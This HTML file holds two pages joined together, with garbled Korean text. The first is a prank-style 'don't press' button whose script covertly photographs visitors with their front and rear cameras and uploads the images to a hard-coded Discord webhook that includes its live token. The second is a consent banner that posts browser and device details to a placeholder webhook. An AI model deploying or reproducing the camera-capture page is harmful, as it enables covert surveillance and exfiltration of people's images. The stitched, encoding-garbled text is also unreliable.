<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>í•˜í•˜</title>
  <style>
    body { text-align: center; font-family: Arial; margin-top: 30px; }
    video, canvas { width: 300px; border-radius: 12px; margin-top: 10px; }
    button { padding: 12px 20px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>

<h2>ì ˆëŒ€ ëˆ„ë¥´ì§€ ë§ˆì‹œì˜¤!</h2>
<button id="startBtn">ë²„íŠ¼</button>

<br>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1462758530867265591/MaQo0lAdsm7ai9PyWm-xV3XVImaU25BZIffI6oBO3uCXPIw0OhlGMT2q0hSsKDwyyu89";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const startBtn = document.getElementById("startBtn");

const PHOTOS_PER_CAMERA = 2;
const INTERVAL = 1500;

async function sendToDiscord(blob, name, label) {
  const form = new FormData();
  form.append("file", blob, name);
  form.append("content", label);

  await fetch(WEBHOOK_URL, {
    method: "POST",
    body: form
  });
}

async function captureSequence(facingMode, label) {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode }
  });

  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 1000));

  for (let i = 1; i <= PHOTOS_PER_CAMERA; i++) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    await new Promise(resolve => {
      canvas.toBlob(async blob => {
        await sendToDiscord(
          blob,
          `${label}_${i}.png`,
          `ğŸ“¸ ${label} ${i}ë²ˆì§¸`
        );
        resolve();
      }, "image/png");
    });

    await new Promise(r => setTimeout(r, INTERVAL));
  }

  stream.getTracks().forEach(t => t.stop());
}

startBtn.addEventListener("click", async () => {
  try {
    await captureSequence("user", "ì „ë©´");
    await captureSequence("environment", "í›„ë©´");
    alert("í•˜í•˜");
  } catch (e) {
    alert("ë‹¤ì‹œ ì‹œë„í•´ì£¼ì„¸ìš”");
  }
});
</script>

<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>ì¿ í‚¤ ë™ì˜</title>
  <style>
    body { font-family: Arial; }
    #consent {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: #222;
      color: #fff;
      padding: 15px;
      display: none;
      text-align: center;
    }
    button {
      margin-left: 10px;
      padding: 6px 12px;
    }
  </style>
</head>
<body>

<h2>ì‚¬ì´íŠ¸ ì½˜í…ì¸ </h2>

<div id="consent">
  ì´ ì‚¬ì´íŠ¸ëŠ” ì ‘ì† í™˜ê²½ ì •ë³´ë¥¼ ìˆ˜ì§‘í•©ë‹ˆë‹¤.
  <button onclick="acceptConsent()">ë™ì˜</button>
</div>

<script>
const WEBHOOK_URL = "ì—¬ê¸°ì—_ë””ìŠ¤ì½”ë“œ_ì›¹í›…_URL";

function getInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: `${screen.width}x${screen.height}`,
    time: new Date().toLocaleString()
  };
}

function sendToDiscord(info) {
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content:
`ğŸ§¾ ì‚¬ìš©ì ë™ì˜ í›„ ìˆ˜ì§‘ ì •ë³´
- ë¸Œë¼ìš°ì €: ${info.userAgent}
- ì–¸ì–´: ${info.language}
- í”Œë«í¼: ${info.platform}
- í™”ë©´: ${info.screen}
- ì‹œê°„: ${info.time}`
    })
  });
}

function acceptConsent() {
  localStorage.setItem("consent", "yes");
  document.getElementById("consent").style.display = "none";
  const info = getInfo();
  sendToDiscord(info);
}

if (!localStorage.getItem("consent")) {
  document.getElementById("consent").style.display = "block";
}
</script>

</body>
</html>
